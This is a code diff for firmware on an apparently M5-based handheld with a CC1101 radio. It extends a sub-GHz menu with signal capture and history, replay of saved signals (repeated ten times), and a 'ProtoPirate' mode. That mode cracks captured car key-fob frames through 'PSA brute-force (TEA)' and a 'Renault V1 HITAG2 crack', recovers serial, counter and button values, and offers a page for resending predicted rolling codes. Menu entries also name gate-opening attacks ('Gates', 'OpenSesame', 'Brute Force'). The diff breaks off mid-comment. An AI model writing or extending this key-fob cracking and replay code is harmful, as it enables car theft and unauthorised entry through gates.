+        sp.setCursor(6, 92);   sp.print(";/. champ   ,// = -/+");
+        sp.setCursor(6, H - 14); sp.print("BACK = appliquer");
+        if (use_sprite) sprite->pushSprite(0, 0);
+    }
+    return changed;
+}
+
+// Dessine le detail d'une capture decodee (corps, sous l'entete). Reutilise par Read/PP/Gates.
+void cc_draw_decoded_detail(LovyanGFX& sp, const SubGhzDecoded& e) {
+    sp.setTextColor(TFT_GREEN, TFT_BLACK);
+    sp.setCursor(10, 22); sp.printf("Protocol: %s", e.protocol ? e.protocol : "?");
+    int nb = max(3, (e.bit_count + 7) / 8);
+    uint64_t mask = e.data & ((e.bit_count < 64) ? ((1ULL << e.bit_count) - 1) : 0xFFFFFFFFFFFFFFFFULL);
+    uint64_t yek = 0;
+    for (int _b = 0; _b < e.bit_count; _b++)
+        yek |= ((mask >> _b) & 1ULL) << (e.bit_count - 1 - _b);
+    sp.setCursor(10, 35); sp.printf("Key:0x%0*llX", nb * 2, mask);
+    sp.setTextColor(TFT_DARKGREEN, TFT_BLACK);
+    sp.setCursor(10, 47); sp.printf("Yek:0x%0*llX", nb * 2, yek);
+    sp.setTextColor(TFT_GREEN, TFT_BLACK);
+    sp.setCursor(10, 59); sp.printf("Bits: %d  Te: %dus", e.bit_count, e.te);
+    int info_y = 71;
+    const char* _bn = pp_button_name(e.protocol, e.btn);   // nom fonctionnel (NULL hors protocoles voiture)
+    if (e.serial) {
+        sp.setCursor(10, info_y);
+        if (_bn) sp.printf("Sn:0x%05X Btn:%X (%s)", e.serial, e.btn, _bn);
+        else     sp.printf("Sn:0x%05X Btn:%X", e.serial, e.btn);
+        info_y += 12;
+    } else if (e.btn) {
+        sp.setCursor(10, info_y);
+        if (_bn) sp.printf("Btn:%X (%s)", e.btn, _bn);
+        else     sp.printf("Btn:%X", e.btn);
+        info_y += 12;
+    }
+    if (e.is_rolling) { sp.setTextColor(TFT_RED, TFT_BLACK); sp.setCursor(10, info_y); sp.print("Rolling code"); info_y += 12; }
+    if (e.cnt && !e.is_rolling) { sp.setTextColor(TFT_YELLOW, TFT_BLACK); sp.setCursor(10, info_y); sp.printf("Cnt: %d", e.cnt); }
+}
+
 void subGhzMenu() {
     keyRelease();
     const int W = 240, H = 135;
@@ -42421,7 +45012,10 @@ void subGhzMenu() {
     if (!cc_open()) {
         M5.Display.setCursor(10, 70); M5.Display.setTextColor(TFT_RED, TFT_BLACK);
         M5.Display.print("CC1101 not found! Check Cap HAT");
-        M5.Display.display(); delay(2000); inMenu = true; return;
+        M5.Display.display(); delay(2000);
+        free(cc_raw_buf); free(cc_raw_pulses);       // fix fuite 10KB (repetee a chaque ouverture sans HAT)
+        cc_raw_buf = nullptr; cc_raw_pulses = nullptr;
+        inMenu = true; return;
     }
 
     M5Canvas* sprite = new(std::nothrow) M5Canvas(&M5.Display);
@@ -42429,11 +45023,15 @@ void subGhzMenu() {
     if (sprite) { sprite->setColorDepth(8); use_sprite = sprite->createSprite(W, H); }
     auto& sp = use_sprite ? (LovyanGFX&)*sprite : (LovyanGFX&)M5.Display;
 
-    const char* items[] = {"Read (decode)", "Read RAW (capture)",
-                           "Saved (replay .sub)", "Freq Analyzer",
+    const char* items[] = {"Read", "Read RAW", "Analyze",
+                           "Saved", "Freq Analyzer",
                            "Spectrum Analyzer", "Waterfall SDR",
-                           "Brute Force"};
-    const int cc_item_count = 7;
+                           "Brute Force", "TPMS Scan", "ProtoPirate",
+                           "Gates", "OpenSesame"};
+    const int cc_item_count = 12;
+    // Ordre du menu decouple du numero de handler (evite de renumeroter tous les
+    // if(mode==N)). Chaque position d'items[] -> son mode. Analyze=12 inseree en pos 2.
+    const int ccModeMap[12] = {1, 2, 12, 3, 4, 5, 6, 7, 8, 9, 10, 11};
     const int cc_lineH = 16;
     const int cc_listY = 18;
     const int cc_maxVis = (H - cc_listY - 14) / cc_lineH;
@@ -42475,7 +45073,7 @@ void subGhzMenu() {
             if (kp(KEY_BACKSPACE)) { keyRelease(); goto sub_exit; }
             if (kp(';')) { cc_sel = (cc_sel - 1 + cc_item_count) % cc_item_count; cc_need_draw = true; delay(150); }
             if (kp('.')) { cc_sel = (cc_sel + 1) % cc_item_count; cc_need_draw = true; delay(150); }
-            if (kp(KEY_ENTER)) { mode = cc_sel + 1; keyRelease(); }
+            if (kp(KEY_ENTER)) { mode = ccModeMap[cc_sel]; keyRelease(); }
             delay(10);
         }
 
@@ -42483,184 +45081,152 @@ void subGhzMenu() {
         cc_set_frequency(freq_hz / 1000000.0f);
         cc_apply_preset(cc_preset_idx);
 
-        // ── Mode 1: Read (decode protocols) ──
+        // ── Mode 1: Read (decode) — liste navigable (historique) + detail + config C ──
+        // Ring RAM borne (HMAX) pour la liste live ; chaque capture aussi loggee sur SD
+        // (/evil/subghz/captures.csv) = stockage principal, pas d'accumulation RAM.
         if (mode == 1) {
             cc_set_raw_rx();
             cc_decoders_reset();
-            cc_isr_start(); // GPIO interrupt captures edges in background
-            SubGhzDecoded last_decoded = {};
-            bool has_decoded = false;
-            unsigned long last_draw = 0;
-            unsigned long edge_count = 0;
-            unsigned long feed_count = 0;
+            cc_isr_start();
+            std::vector<SubGhzDecoded> hist; std::vector<uint16_t> hits;
+            int sel = 0, listStart = 0;
+            bool detail = false, follow = true;
+            unsigned long last_draw = 0, edge_count = 0, feed_count = 0;
+            std::vector<int> read_gbuf; read_gbuf.reserve(768);
+            unsigned long read_last_edge = millis();
+            const int HMAX = 25;
+
+            auto push_gate = [&](GateCode& g) {
+                SubGhzDecoded d = {};
+                d.protocol = g.protocol; d.data = g.key; d.bit_count = g.Bit;
+                d.serial = g.serial; d.btn = g.btn; d.cnt = g.cnt; d.is_rolling = true; d.te = g.te;
+                cc_hist_push(hist, hits, d, HMAX, sel, follow && !detail, freq_hz, (uint8_t)cc_preset_idx);
+                cc_hist_log_sd(d, freq_hz);
+            };
 
             while (true) {
-                // Drain ISR edge buffer — process all captured edges
                 bool level; int32_t dur;
                 while (cc_isr_read(&level, &dur)) {
-                    edge_count++;
-                    feed_count++;
+                    edge_count++; feed_count++;
                     SubGhzDecoded d = {};
                     if (cc_decoders_feed(level, dur, d)) {
-                        last_decoded = d;
-                        last_decoded.te = d.te;
-                        has_decoded = true;
+                        cc_hist_push(hist, hits, d, HMAX, sel, follow && !detail, freq_hz, (uint8_t)cc_preset_idx);
+                        cc_hist_log_sd(d, freq_hz);
+                    }
+                    if (dur > 60 && dur < 30000) read_gbuf.push_back(level ? dur : -dur);
+                    read_last_edge = millis();
+                    if (read_gbuf.size() >= 700) {
+                        GateCode g; if (gate_multi_decode(read_gbuf, g)) push_gate(g);
+                        read_gbuf.clear();
                     }
                 }
+                // Fin de rafale -> decodeurs portails/volets
+                if (read_gbuf.size() >= 40 && (millis() - read_last_edge) > 20) {
+                    GateCode g; if (gate_multi_decode(read_gbuf, g)) push_gate(g);
+                    read_gbuf.clear();
+                }
 
-                // Check keys + draw UI — ISR keeps capturing edges in background
                 unsigned long now = millis();
-                {
-                    M5.update(); cardUpdate();
-                    if (kp(KEY_BACKSPACE)) { keyRelease(); cc_isr_stop(); break; }
-                    if (kp('+') || kp('=')) {
-                        keyRelease(); cc_isr_stop();
-                        cc_freq_idx = min(cc_freq_idx+1, 17);
-                        freq_hz = cc_frequencies[cc_freq_idx]*1000;
-                        cc_set_frequency(freq_hz/1000000.0f);
-                        cc_set_raw_rx(); cc_decoders_reset(); cc_isr_start();
-                    }
-                    if (kp('-') || kp('_')) {
-                        keyRelease();
-                        cc_freq_idx = max(cc_freq_idx-1, 0);
-                        freq_hz = cc_frequencies[cc_freq_idx]*1000;
-                        cc_set_frequency(freq_hz/1000000.0f);
-                        cc_isr_stop(); cc_set_raw_rx(); cc_decoders_reset(); cc_isr_start();
-                    }
-                    if (kp(KEY_TAB)) {
-                        keyRelease();
-                        cc_preset_idx = (cc_preset_idx + 1) % 4;
+                M5.update(); cardUpdate();
+
+                if (kp(KEY_BACKSPACE)) { keyRelease();
+                    if (detail) { detail = false; last_draw = 0; }
+                    else { cc_isr_stop(); break; }
+                }
+                // C = config RF (freq + modulation)
+                if (kp('c') || kp('C')) { keyRelease(); cc_isr_stop();
+                    if (cc_config_popup(sp, use_sprite, sprite, W, H, cc_freq_idx, cc_preset_idx)) {
+                        freq_hz = cc_frequencies[cc_freq_idx] * 1000;
+                        cc_set_frequency(freq_hz / 1000000.0f);
                         cc_apply_preset(cc_preset_idx);
-                        cc_isr_stop(); cc_set_raw_rx(); cc_decoders_reset(); cc_isr_start();
+                    }
+                    cc_set_raw_rx(); cc_decoders_reset(); cc_isr_start(); last_draw = 0;
+                }
+
+                if (!detail) {
+                    if (kp(';')) { keyRelease(); if (sel > 0) sel--; follow = false; last_draw = 0; delay(120); }
+                    if (kp('.')) { keyRelease();
+                        if (sel < (int)hist.size() - 1) sel++;
+                        if (sel >= (int)hist.size() - 1) follow = true;
+                        last_draw = 0; delay(120); }
+                    if (kp(KEY_ENTER) && !hist.empty()) { keyRelease(); detail = true; last_draw = 0; }
+                } else {
+                    if (kp(';')) { keyRelease(); if (sel > 0) sel--; last_draw = 0; delay(120); }
+                    if (kp('.')) { keyRelease(); if (sel < (int)hist.size() - 1) sel++; last_draw = 0; delay(120); }
+                    // S = emettre l'entree selectionnee (sur SA freq + modulation de capture)
+                    if (!hist.empty() && (kp('s') || kp('S'))) { keyRelease();
+                        int32_t enc[256]; int nc = cc_encode_signal(hist[sel], enc, 256);
+                        if (nc > 0) {
+                            sp.fillRect(10, 95, 220, 20, TFT_BLACK); sp.setTextColor(TFT_CYAN, TFT_BLACK);
+                            sp.setCursor(10, 95); sp.printf("Sending %s @%.3f...", hist[sel].protocol,
+                                                            (hist[sel].cap_freq_hz ? hist[sel].cap_freq_hz : freq_hz) / 1000000.0f);
+                            if (use_sprite) sprite->pushSprite(0, 0);
+                            cc_isr_stop();
+                            cc_tx_on_capture(enc, nc, hist[sel], freq_hz, cc_preset_idx, false, 3);
+                            cc_set_raw_rx(); cc_decoders_reset(); cc_isr_start();
+                        }
+                        last_draw = 0;
+                    }
+                    // ENTER = sauver en .sub (rejouable par Saved)
+                    if (!hist.empty() && kp(KEY_ENTER)) { keyRelease();
+                        SD.mkdir("/evil/subghz");
+                        char fn[64]; snprintf(fn, sizeof(fn), "/evil/subghz/%s_%lu.sub", hist[sel].protocol, millis());
+                        int32_t enc[256]; int nc = cc_encode_signal(hist[sel], enc, 256);
+                        if (nc > 0) cc_save_sub(fn, freq_hz, cc_presets[cc_preset_idx].sub_name, enc, nc);
+                        else        cc_save_sub_key(fn, freq_hz, hist[sel]);
+                        sp.fillRect(10, 100, 220, 12, TFT_BLACK); sp.setTextColor(TFT_GREEN, TFT_BLACK);
+                        sp.setCursor(10, 100); sp.print("Saved!"); if (use_sprite) sprite->pushSprite(0, 0); delay(400);
+                        last_draw = 0;
                     }
                 }
 
-                if (now - last_draw < 200) continue;
+                if (now - last_draw < 200) { delay(2); continue; }
                 last_draw = now;
 
                 sp.fillScreen(TFT_BLACK);
-                sp.fillRect(0, 0, W, 14, 0x0841);
-                sp.drawFastHLine(0, 14, W, 0xFC00);
+                sp.fillRect(0, 0, W, 14, 0x0841); sp.drawFastHLine(0, 14, W, 0xFC00);
                 sp.setTextSize(1); sp.setTextFont(1);
                 sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3);
-                sp.printf("Read %s %.3fMHz", cc_presets[cc_preset_idx].name, freq_hz/1000000.0f);
-                float rssi = cc_get_rssi();
-                sp.setCursor(W-55, 3); sp.printf("%.0fdBm", rssi);
+                sp.printf("Read %s %.3fMHz", cc_presets[cc_preset_idx].name, freq_hz / 1000000.0f);
+                sp.setCursor(W - 55, 3); sp.printf("%.0fdBm", cc_get_rssi());
 
-                if (has_decoded) {
-                    sp.setTextColor(TFT_GREEN, TFT_BLACK);
-                    sp.setCursor(10, 22); sp.printf("Protocol: %s", last_decoded.protocol);
-                    int nb = max(3, (last_decoded.bit_count+7)/8);
-                    uint64_t mask = last_decoded.data & ((last_decoded.bit_count < 64)
-                        ? ((1ULL << last_decoded.bit_count) - 1) : 0xFFFFFFFFFFFFFFFFULL);
-                    uint64_t yek = 0;
-                    for (int _b = 0; _b < last_decoded.bit_count; _b++)
-                        yek |= ((mask >> _b) & 1ULL) << (last_decoded.bit_count - 1 - _b);
-                    sp.setCursor(10, 35); sp.printf("Key:0x%0*llX", nb*2, mask);
+                if (detail && !hist.empty()) {
+                    cc_draw_decoded_detail(sp, hist[sel]);
                     sp.setTextColor(TFT_DARKGREEN, TFT_BLACK);
-                    sp.setCursor(10, 47); sp.printf("Yek:0x%0*llX", nb*2, yek);
-                    sp.setTextColor(TFT_GREEN, TFT_BLACK);
-                    sp.setCursor(10, 59); sp.printf("Bits: %d  Te: %dus", last_decoded.bit_count, last_decoded.te);
-                    int info_y = 71;
-                    if (last_decoded.serial) {
-                        sp.setCursor(10, info_y);
-                        sp.printf("Sn:0x%05X Btn:%X", last_decoded.serial, last_decoded.btn);
-                        info_y += 12;
-                    } else if (last_decoded.btn && !last_decoded.serial) {
-                        sp.setCursor(10, info_y); sp.printf("Btn:%X", last_decoded.btn);
-                        info_y += 12;
-                    }
-                    // DIP display for Ansonic, Doitrand, Linear
-                    bool has_dip = last_decoded.cnt && (
-                        strcmp(last_decoded.protocol, "Ansonic") == 0 ||
-                        strcmp(last_decoded.protocol, "Doitrand") == 0);
-                    if (has_dip) {
-                        uint16_t d = last_decoded.cnt;
-                        sp.setTextColor(TFT_YELLOW, TFT_BLACK);
-                        sp.setCursor(10, info_y);
-                        sp.printf("DIP:%c%c%c%c%c%c%c%c%c%c",
-                            d&0x800?'1':'0', d&0x400?'1':'0', d&0x200?'1':'0',
-                            d&0x100?'1':'0', d&0x080?'1':'0', d&0x040?'1':'0',
-                            d&0x020?'1':'0', d&0x010?'1':'0', d&0x001?'1':'0',
-                            d&0x008?'1':'0');
-                        info_y += 12;
-                    } else if (strcmp(last_decoded.protocol, "Linear") == 0 && last_decoded.cnt) {
-                        sp.setTextColor(TFT_YELLOW, TFT_BLACK);
-                        sp.setCursor(10, info_y);
-                        uint16_t d = last_decoded.cnt;
-                        sp.printf("DIP:%c%c%c%c%c%c%c%c%c%c",
-                            d&0x200?'1':'0', d&0x100?'1':'0', d&0x080?'1':'0',
-                            d&0x040?'1':'0', d&0x020?'1':'0', d&0x010?'1':'0',
-                            d&0x008?'1':'0', d&0x004?'1':'0', d&0x002?'1':'0',
-                            d&0x001?'1':'0');
-                        info_y += 12;
-                    }
-                    if (last_decoded.is_rolling) {
-                        sp.setTextColor(TFT_RED, TFT_BLACK);
-                        sp.setCursor(10, info_y); sp.print("Rolling code");
-                        info_y += 12;
-                    }
-                    if (last_decoded.cnt && !has_dip && strcmp(last_decoded.protocol, "Linear") != 0) {
-                        sp.setTextColor(TFT_YELLOW, TFT_BLACK);
-                        sp.setCursor(10, info_y); sp.printf("Cnt: %d", last_decoded.cnt);
-                    }
+                    sp.setCursor(2, 108); sp.printf("#%d/%d  vu x%u", sel + 1, (int)hist.size(), hits[sel]);
+                    sp.fillRect(0, H - 14, W, 14, 0x0841);
+                    sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12);
+                    sp.print(";/. prec/suiv S=TX ENT=save BACK");
                 } else {
-                    sp.setTextColor(TFT_YELLOW, TFT_BLACK);
-                    sp.setCursor(30, 55); sp.print("Waiting for signal...");
-                }
-
-                sp.setTextColor(TFT_DARKGREEN, TFT_BLACK);
-                sp.setCursor(2, 108); sp.printf("Edges:%lu Feed:%lu", edge_count, feed_count);
-                sp.fillRect(0, H-14, W, 14, 0x0841);
-                sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
-                sp.print("+/-=freq S=send ENT=save");
-                if (use_sprite) sprite->pushSprite(0, 0);
-
-                // Send on S — encode and transmit directly
-                if (has_decoded && (kp('s') || kp('S'))) {
-                    keyRelease();
-                    int32_t enc_pulses[256];
-                    int enc_count = cc_encode_signal(last_decoded, enc_pulses, 256);
-                    if (enc_count > 0) {
-                        sp.fillRect(10, 95, 220, 20, TFT_BLACK);
-                        sp.setTextColor(TFT_CYAN, TFT_BLACK);
-                        sp.setCursor(10, 95); sp.printf("Sending %s...", last_decoded.protocol);
-                        if (use_sprite) sprite->pushSprite(0, 0);
-                        cc_isr_stop(); cc_send_raw(enc_pulses, enc_count, 1);
-                        sp.setCursor(160, 95); sp.print("Done!");
-                        if (use_sprite) sprite->pushSprite(0, 0);
-                        delay(500);
-                    }
-                    cc_set_raw_rx(); cc_decoders_reset(); cc_isr_start();
-                }
-
-                // Save on ENTER — encode as RAW .sub so Saved can replay it
-                if (has_decoded && kp(KEY_ENTER)) {
-                    keyRelease();
-                    SD.mkdir("/evil/subghz");
-                    char fname[64];
-                    snprintf(fname, sizeof(fname), "/evil/subghz/%s_%lu.sub",
-                             last_decoded.protocol, millis());
-                    int32_t enc_pulses[256];
-                    int enc_count = cc_encode_signal(last_decoded, enc_pulses, 256);
-                    Serial.printf("[ENC] %s %d bits → %d pulses:", last_decoded.protocol, last_decoded.bit_count, enc_count);
-                    for (int _e = 0; _e < min(20, enc_count); _e++) Serial.printf(" %d", enc_pulses[_e]);
-                    Serial.println();
-                    if (enc_count > 0) {
-                        cc_save_sub(fname, freq_hz, cc_presets[cc_preset_idx].sub_name, enc_pulses, enc_count);
+                    if (hist.empty()) {
+                        sp.setTextColor(TFT_YELLOW, TFT_BLACK);
+                        sp.setCursor(28, 55); sp.print("Waiting for signal...");
                     } else {
-                        cc_save_sub_key(fname, freq_hz, last_decoded);
+                        int lineH = 13, listY = 18, maxVis = (H - listY - 14) / lineH;
+                        if (sel < listStart) listStart = sel;
+                        if (sel >= listStart + maxVis) listStart = sel - maxVis + 1;
+                        for (int i = 0; i < maxVis && (listStart + i) < (int)hist.size(); i++) {
+                            int idx = listStart + i; const SubGhzDecoded& e = hist[idx];
+                            int y = listY + i * lineH; bool s = (idx == sel);
+                            if (s) { sp.fillRect(0, y, W, lineH, TFT_NAVY); sp.setTextColor(TFT_GREEN, TFT_NAVY); }
+                            else sp.setTextColor(TFT_WHITE, TFT_BLACK);
+                            int nb = max(3, (e.bit_count + 7) / 8); int hx = nb * 2 > 10 ? 10 : nb * 2;
+                            uint64_t mask = e.data & ((e.bit_count < 64) ? ((1ULL << e.bit_count) - 1) : 0xFFFFFFFFFFFFFFFFULL);
+                            sp.setCursor(4, y + 2);
+                            sp.printf("%-9.9s %0*llX", e.protocol ? e.protocol : "?", hx, (unsigned long long)mask);
+                            if (hits[idx] > 1) { sp.setCursor(W - 26, y + 2); sp.printf("x%u", hits[idx]); }
+                        }
                     }
-                    sp.fillRect(10, 100, 220, 12, TFT_BLACK);
-                    sp.setTextColor(TFT_GREEN, TFT_BLACK);
-                    sp.setCursor(10, 100); sp.print("Saved!");
-                    if (use_sprite) sprite->pushSprite(0, 0);
-                    delay(500);
+                    sp.fillRect(0, H - 14, W, 14, 0x0841);
+                    sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12);
+                    sp.print(";/. sel ENT=detail C=config BACK");
                 }
+                if (use_sprite) sprite->pushSprite(0, 0);
+                delay(2);
             }
+        }
 
         // ── Mode 2: Read RAW (Flipper-style, SD streaming, infinite capture) ──
-        }
         if (mode == 2) {
             cc_set_raw_rx();
             SD.mkdir("/evil/subghz");
@@ -42842,12 +45408,12 @@ void subGhzMenu() {
                     if (rdata && rcnt > 0) {
                         sp.setCursor(10, 90); sp.printf("Sending %d pulses (SD)...", rcnt);
                         if (use_sprite) sprite->pushSprite(0, 0);
-                        cc_send_raw(rdata, rcnt, 1);
+                        cc_send_raw(rdata, rcnt, 10);
                         free(rdata);
                     } else {
                         sp.setCursor(10, 90); sp.printf("Sending %d pulses (RAM)...", cc_raw_count);
                         if (use_sprite) sprite->pushSprite(0, 0);
-                        cc_send_raw(cc_raw_pulses, min(cc_raw_count, CC_MAX_PULSES), 1);
+                        cc_send_raw(cc_raw_pulses, min(cc_raw_count, CC_MAX_PULSES), 10);
                     }
                     sp.setTextColor(TFT_GREEN, TFT_BLACK);
                     sp.setCursor(10, 104); sp.print("Done!");
@@ -42915,18 +45481,63 @@ void subGhzMenu() {
                         }
                         if (kp(KEY_ENTER)) {
                             keyRelease();
-                            uint32_t fhz; int cnt;
+                            uint32_t fhz = 433920000; int cnt = 0;
                             int32_t* sub_data = cc_load_sub_malloc(files[sel].c_str(), &fhz, &cnt);
                             if (sub_data && cnt > 0) {
-                                cc_set_frequency(fhz / 1000000.0f);
-                                sp.fillScreen(TFT_BLACK);
-                                sp.setTextColor(TFT_GREEN, TFT_BLACK);
-                                sp.setCursor(10, 50); sp.printf("Sending %d pulses...", cnt);
-                                if (use_sprite) sprite->pushSprite(0, 0);
-                                cc_send_raw(sub_data, cnt, 1);
-                                sp.setCursor(10, 70); sp.print("Done!");
-                                if (use_sprite) sprite->pushSprite(0, 0);
-                                delay(1000);
+                                // Decode (pour l'affichage) comme en Read/Analyze
+                                cc_decoders_reset(); pp_decoders_reset();
+                                SubGhzDecoded dec = {}; bool decoded = false;
+                                std::vector<int> gb; gb.reserve(768);
+                                for (int i = 0; i < cnt; i++) {
+                                    bool lvl = sub_data[i] > 0; int32_t dur = sub_data[i] > 0 ? sub_data[i] : -sub_data[i];
+                                    SubGhzDecoded d = {};
+                                    if (cc_decoders_feed(lvl, dur, d)) { dec = d; decoded = true; }
+                                    SubGhzDecoded pd = {};
+                                    if (pp_decoders_feed(lvl, dur, pd)) { dec = pd; decoded = true; }
+                                    if (dur > 60 && dur < 30000) gb.push_back(sub_data[i]);
+                                }
+                                { GateCode g; if (gate_multi_decode(gb, g)) { dec = {}; dec.protocol = g.protocol; dec.data = g.key; dec.bit_count = g.Bit; dec.serial = g.serial; dec.btn = g.btn; dec.cnt = g.cnt; dec.is_rolling = true; dec.te = g.te; decoded = true; } }
+                                String fn = files[sel].substring(files[sel].lastIndexOf('/') + 1);
+                                // ── Page detail + confirmation avant RESEND ──
+                                bool ddraw = true;
+                                while (true) {
+                                    if (ddraw) {
+                                        sp.fillScreen(TFT_BLACK);
+                                        sp.fillRect(0, 0, W, 14, 0x0841); sp.drawFastHLine(0, 14, W, 0xFC00);
+                                        sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Saved");
+                                        sp.setCursor(W - 62, 3); sp.printf("%.3fMHz", fhz / 1000000.0f);
+                                        if (decoded) {
+                                            cc_draw_decoded_detail(sp, dec);   // fiche complete identique a Read
+                                            sp.setTextColor(TFT_DARKGREEN, TFT_BLACK); sp.setCursor(2, 96);
+                                            { String s = fn; if (s.length() > 28) s = s.substring(0, 28); sp.print(s); }
+                                        } else {
+                                            sp.setTextColor(TFT_WHITE, TFT_BLACK); sp.setCursor(4, 24);
+                                            { String s = fn; if (s.length() > 30) s = s.substring(0, 30); sp.print(s); }
+                                            sp.setTextColor(TFT_GREEN, TFT_BLACK);
+                                            sp.setCursor(4, 44); sp.printf("Freq  : %.3f MHz", fhz / 1000000.0f);
+                                            sp.setCursor(4, 58); sp.printf("Pulses: %d", cnt);
+                                            sp.setTextColor(0x8410, TFT_BLACK);
+                                            sp.setCursor(4, 78); sp.print("RAW (rejouable, non decode)");
+                                        }
+                                        sp.fillRect(0, H - 14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H - 12);
+                                        sp.print("ENTER/S = RESEND   BACK");
+                                        if (use_sprite) sprite->pushSprite(0, 0); ddraw = false;
+                                    }
+                                    M5.update(); cardUpdate();
+                                    if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+                                    if (kp(KEY_ENTER) || kp('s') || kp('S')) {
+                                        keyRelease();
+                                        cc_set_frequency(fhz / 1000000.0f);
+                                        sp.fillRect(0, H - 14, W, 14, 0x0841); sp.setTextColor(TFT_GREEN, 0x0841);
+                                        sp.setCursor(4, H - 12); sp.printf("Sending %d pulses...", cnt);
+                                        if (use_sprite) sprite->pushSprite(0, 0);
+                                        cc_send_raw(sub_data, cnt, 10);
+                                        sp.fillRect(0, H - 14, W, 14, 0x0841); sp.setTextColor(TFT_YELLOW, 0x0841);
+                                        sp.setCursor(4, H - 12); sp.print("Done! ENTER/S=re-send BACK");
+                                        if (use_sprite) sprite->pushSprite(0, 0); delay(400); ddraw = false;
+                                    }
+                                    delay(10);
+                                }
                                 free(sub_data);
                             } else {
                                 sp.fillScreen(TFT_BLACK);
@@ -43089,6 +45700,597 @@ void subGhzMenu() {
                 cc_set_raw_rx();
             }
             bf_done:;
+        } else if (mode == 8) {
+            cc_tpms_scan(sp, use_sprite, sprite);
+            cc_set_raw_rx();
+        } else if (mode == 9) {
+            // ── ProtoPirate : cles de voiture — liste navigable + detail + config C ──
+            // Detail : K=crack (PSA TEA / Renault V1 HITAG2), S=page Send/Resend (renvoi
+            // possible apres crack : "PSA (crack)"/"Renault V1 (crack)"). Ring RAM borne +
+            // log SD. Preset AM (OOK) par defaut a l'entree ; modifiable via C.
+            cc_preset_idx = 0; cc_apply_preset(0);
+            cc_set_raw_rx(); pp_decoders_reset(); cc_isr_start();
+            std::vector<SubGhzDecoded> hist; std::vector<uint16_t> hits;
+            int sel = 0, listStart = 0;
+            bool detail = false, follow = true;
+            unsigned long last_draw = 0, pp_edges = 0, pp_hits = 0;
+            const int HMAX = 25;
+
+            while (true) {
+                bool level; int32_t dur;
+                while (cc_isr_read(&level, &dur)) {
+                    pp_edges++;
+                    SubGhzDecoded d = {};
+                    if (pp_decoders_feed(level, dur, d)) {
+                        cc_hist_push(hist, hits, d, HMAX, sel, follow && !detail, freq_hz, (uint8_t)cc_preset_idx);
+                        cc_hist_log_sd(d, freq_hz); pp_hits++;
+                    }
+                }
+                unsigned long now = millis();
+                M5.update(); cardUpdate();
+
+                if (kp(KEY_BACKSPACE)) { keyRelease();
+                    if (detail) { detail = false; last_draw = 0; }
+                    else { cc_isr_stop(); break; }
+                }
+                // C = config RF (freq + modulation)
+                if (kp('c') || kp('C')) { keyRelease(); cc_isr_stop();
+                    if (cc_config_popup(sp, use_sprite, sprite, W, H, cc_freq_idx, cc_preset_idx)) {
+                        freq_hz = cc_frequencies[cc_freq_idx] * 1000;
+                        cc_set_frequency(freq_hz / 1000000.0f); cc_apply_preset(cc_preset_idx);
+                    }
+                    cc_set_raw_rx(); pp_decoders_reset(); cc_isr_start(); last_draw = 0;
+                }
+
+                if (!detail) {
+                    if (kp(';')) { keyRelease(); if (sel > 0) sel--; follow = false; last_draw = 0; delay(120); }
+                    if (kp('.')) { keyRelease();
+                        if (sel < (int)hist.size() - 1) sel++;
+                        if (sel >= (int)hist.size() - 1) follow = true; last_draw = 0; delay(120); }
+                    if (kp(KEY_ENTER) && !hist.empty()) { keyRelease(); detail = true; last_draw = 0; }
+                } else {
+                    if (kp(';')) { keyRelease(); if (sel > 0) sel--; last_draw = 0; delay(120); }
+                    if (kp('.')) { keyRelease(); if (sel < (int)hist.size() - 1) sel++; last_draw = 0; delay(120); }
+
+                    // K = crack crypto on-demand sur l'entree selectionnee
+                    bool is_rv1 = !hist.empty() && hist[sel].protocol && strcmp(hist[sel].protocol, "Renault V1") == 0;
+                    if ((kp('k') || kp('K')) && !hist.empty() && (pp_bf_available() || is_rv1)) {
+                        keyRelease(); cc_isr_stop();
+                        bool armed = pp_bf_available();
+                        if (!armed && is_rv1)
+                            armed = pp_bf_arm_renault(hist[sel].data, hist[sel].data_2, hist[sel].serial, hist[sel].btn, hist[sel].cnt);
+                        const char* crk = is_rv1 ? "Renault V1 HITAG2 crack" : "PSA brute-force (TEA)";
+                        if (armed) {
+                            pp_bf_start();
+                            while (pp_bf_is_running()) {
+                                M5.update(); cardUpdate();
+                                if (kp(KEY_BACKSPACE)) { keyRelease(); pp_bf_cancel(); }
+                                uint32_t cur = pp_bf_progress(), tot = pp_bf_total();
+                                int pct = tot ? (int)((uint64_t)cur * 100 / tot) : 0;
+                                sp.fillScreen(TFT_BLACK);
+                                sp.fillRect(0,0,W,14,0x0841); sp.drawFastHLine(0,14,W,0xFC00);
+                                sp.setTextColor(0xFC00,0x0841); sp.setCursor(2,3); sp.print(crk);
+                                sp.setTextColor(TFT_CYAN,TFT_BLACK);
+                                sp.setCursor(10,38); sp.printf("Cracking: %d%%", pct);
+                                sp.setTextColor(TFT_DARKGREY,TFT_BLACK);
+                                sp.setCursor(10,52); sp.printf("%lu / %lu", (unsigned long)cur, (unsigned long)tot);
+                                sp.drawRect(10, 70, W-20, 12, TFT_WHITE);
+                                int bw = (int)((W-22) * (pct/100.0f));
+                                if (bw > 0) sp.fillRect(11, 71, bw, 10, TFT_GREEN);
+                                sp.setTextColor(0x5AEB,TFT_BLACK); sp.setCursor(10,95); sp.print("BACK = cancel");
+                                if (use_sprite) sprite->pushSprite(0,0);
+                                delay(60);
+                            }
+                            if (pp_bf_status() == PSA_BF_STATUS_FOUND) {
+                                hist[sel].protocol = is_rv1 ? "Renault V1 (crack)" : "PSA (crack)";
+                                hist[sel].serial = pp_bf_serial();
+                                hist[sel].cnt = (uint16_t)pp_bf_counter();
+                                hist[sel].btn = pp_bf_button();
+                                hist[sel].is_rolling = true;
+                            }
+                        } else {
+                            sp.fillRect(0,88,W,18,TFT_BLACK);
+                            sp.setTextColor(TFT_RED,TFT_BLACK); sp.setCursor(6,90);
+                            sp.print("Frame not crackable"); if (use_sprite) sprite->pushSprite(0,0);
+                            delay(900);
+                        }
+                        pp_bf_clear();
+                        cc_apply_preset(cc_preset_idx);
+                        cc_set_raw_rx(); pp_decoders_reset(); cc_isr_start(); last_draw = 0;
+                    }
+
+                    // S = page Send/Resend sur l'entree selectionnee (predit tous les boutons)
